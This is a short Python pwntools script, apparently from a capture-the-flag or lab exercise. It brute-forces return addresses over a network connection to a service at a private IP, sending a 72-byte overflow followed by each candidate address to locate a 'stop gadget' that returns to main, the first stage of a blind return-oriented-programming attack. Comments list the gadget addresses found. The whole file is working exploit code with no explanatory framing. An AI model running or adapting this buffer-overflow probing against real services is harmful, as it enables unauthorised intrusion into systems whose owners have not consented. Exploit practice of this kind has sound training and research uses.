from pwn import *
'''
find a gadget return main function
'''
def get_stop():
    addr = 0x400000
    f = open('1.txt','w')
    while 1:
        sleep(0.1)
        addr += 1
        try:

            print hex(addr)
            p = remote('192.168.10.185',4444)
            p.recvuntil("WelCome my friend,Do you know password?\n")
            payload = 'a'*72 + p64(addr)
            p.sendline(payload)
            data = p.recv()
            p.close()
            if data.startswith('WelCome'):
                print "main funciton-->[%s]"%hex(addr)
                pause()
                return addr
            else:
                print 'one success addr : 0x%x'%(addr)
        except EOFError as e:
            p.close()
            log.info("bad :0x%x"%addr)
        except:
            log.info("can't connect")
            addr -= 1

data = get_stop()
print hex(data)
#stop_gadget -->[0x4006d5]
#stop_gadget -->[0x4005c0] return to main function
